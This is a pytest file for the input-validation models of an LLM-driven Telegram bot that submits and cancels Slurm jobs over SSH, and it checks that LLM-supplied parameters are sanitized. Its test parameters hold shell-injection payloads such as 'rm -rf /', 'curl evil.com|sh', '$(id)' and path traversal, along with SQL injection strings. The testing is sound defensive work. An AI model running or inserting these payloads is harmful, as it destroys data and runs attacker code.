"""Tests de los modelos de dominio: validación y sanitización.

Esta es la frontera de seguridad del sistema: si estos tests pasan,
ningún parámetro malicioso del LLM llega a construir un comando.
"""
import pytest
from pydantic import ValidationError

from becario.domain.models import (
    ClusterIdentity,
    HistoryFilter,
    Intent,
    JobId,
    PendingAction,
    RemoteDirRequest,
    SlurmJobRequest,
)


class TestSlurmJobRequest:
    def test_valid_request(self):
        req = SlurmJobRequest(
            job_name="grafeno_dft",
            partition="gpu",
            nodes=2,
            time_limit="12:00:00",
            script_path="/home/user/calc.sh",
        )
        assert req.job_name == "grafeno_dft"
        assert req.nodes == 2

    def test_defaults(self):
        req = SlurmJobRequest(script_path="/opt/run.sh")
        assert req.job_name == "becario_job"
        assert req.partition == "default"
        assert req.nodes == 1
        assert req.time_limit == "01:00:00"

    def test_job_name_is_sanitized_not_rejected(self):
        # El nombre viene del LLM: caracteres raros se reemplazan por _
        req = SlurmJobRequest(job_name="mi job; rm -rf /", script_path="/a/b.sh")
        assert ";" not in req.job_name
        assert " " not in req.job_name
        assert "/" not in req.job_name

    @pytest.mark.parametrize(
        "evil",
        [
            "/tmp/x.sh; rm -rf /",
            "/tmp/x.sh && curl evil.com|sh",
            "/tmp/$(whoami).sh",
            "/tmp/`id`.sh",
            "relative/path.sh",
            "/tmp/../etc/passwd",
            "/tmp/x.sh\nscancel -u root",
            "/tmp/x'.sh",
        ],
    )
    def test_script_path_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            SlurmJobRequest(script_path=evil)

    @pytest.mark.parametrize("evil", ["gpu; ls", "gpu&&id", "gpu partition", "gpu\n"])
    def test_partition_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            SlurmJobRequest(partition=evil, script_path="/a/b.sh")

    @pytest.mark.parametrize(
        "bad_time", ["100", "1:2:3x", "24h", "; sleep 99", "01:00:00; ls"]
    )
    def test_time_limit_injection_rejected(self, bad_time):
        with pytest.raises(ValidationError):
            SlurmJobRequest(time_limit=bad_time, script_path="/a/b.sh")

    @pytest.mark.parametrize("good_time", ["01:00:00", "123:59:59", "2-12:00:00"])
    def test_time_limit_valid_formats(self, good_time):
        req = SlurmJobRequest(time_limit=good_time, script_path="/a/b.sh")
        assert req.time_limit == good_time

    def test_nodes_bounds(self):
        with pytest.raises(ValidationError):
            SlurmJobRequest(nodes=0, script_path="/a/b.sh")
        with pytest.raises(ValidationError):
            SlurmJobRequest(nodes=1000, script_path="/a/b.sh")


class TestJobId:
    @pytest.mark.parametrize("good", ["12345", "1", "123456_78"])
    def test_valid(self, good):
        assert JobId(value=good).value == good

    @pytest.mark.parametrize(
        "evil",
        ["12345; scancel -u root", "$(id)", "12345 67890", "", "abc", "12\n345"],
    )
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            JobId(value=evil)

    def test_surrounding_whitespace_is_normalized(self):
        # Los LLM suelen agregar whitespace: se limpia con strip y luego se
        # valida estricto. El resultado nunca contiene el newline.
        assert JobId(value="12345\n").value == "12345"
        assert JobId(value="  12345  ").value == "12345"


class TestRemoteDirRequest:
    @pytest.mark.parametrize("good", ["/home/ana/pruebas", "/scratch/runs/Zr_hcp"])
    def test_valid(self, good):
        assert RemoteDirRequest(path=good).path == good

    def test_surrounding_whitespace_is_normalized(self):
        assert RemoteDirRequest(path="  /home/ana/pruebas  ").path == "/home/ana/pruebas"

    @pytest.mark.parametrize(
        "evil",
        [
            "relativa/pruebas",
            "/tmp/../etc",
            "/tmp/x; rm -rf /",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/x\nscancel -u root",
            "/tmp/x'",
            "",
        ],
    )
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            RemoteDirRequest(path=evil)


class TestHistoryFilter:
    def test_sql_wildcards_are_data_not_code(self):
        # Con queries parametrizadas, esto es solo texto de búsqueda.
        flt = HistoryFilter(name_contains="'; DROP TABLE historial_calculos; --")
        assert flt.name_contains is not None

    def test_bad_job_id_rejected(self):
        with pytest.raises(ValidationError):
            HistoryFilter(job_id="1 OR 1=1")

    def test_limit_bounds(self):
        with pytest.raises(ValidationError):
            HistoryFilter(limit=0)
        with pytest.raises(ValidationError):
            HistoryFilter(limit=999)


class TestPendingAction:
    def test_tokens_are_unique(self):
        a1 = PendingAction(chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={})
        a2 = PendingAction(chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={})
        assert a1.token != a2.token

    def test_expiry(self):
        action = PendingAction(
            chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={}
        )
        assert not action.expired(ttl_seconds=60)
        action.created_at -= 120
        assert action.expired(ttl_seconds=60)


class TestClusterIdentity:
    def test_valid(self):
        idn = ClusterIdentity(
            telegram_user_id=111, ssh_user="jperez", ssh_key_path="/x/id_rsa"
        )
        assert idn.ssh_user == "jperez"
        assert idn.ssh_host is None  # usa el host global por defecto

    @pytest.mark.parametrize(
        "evil", ["root; rm -rf /", "Jperez", "j perez", "-jperez", "a" * 33]
    )
    def test_invalid_ssh_user_rejected(self, evil):
        with pytest.raises(ValidationError):
            ClusterIdentity(telegram_user_id=1, ssh_user=evil, ssh_key_path="/x")

    def test_optional_host_override(self):
        idn = ClusterIdentity(
            telegram_user_id=1, ssh_user="jperez", ssh_key_path="/x",
            ssh_host="otro-cluster.edu.ar",
        )
        assert idn.ssh_host == "otro-cluster.edu.ar"


class TestIntent:
    def test_destructive_set(self):
        assert Intent.SUBMIT_SLURM in Intent.destructive()
        assert Intent.CANCEL_JOB in Intent.destructive()
        assert Intent.CHECK_STATUS not in Intent.destructive()
        assert Intent.QUERY_DB not in Intent.destructive()
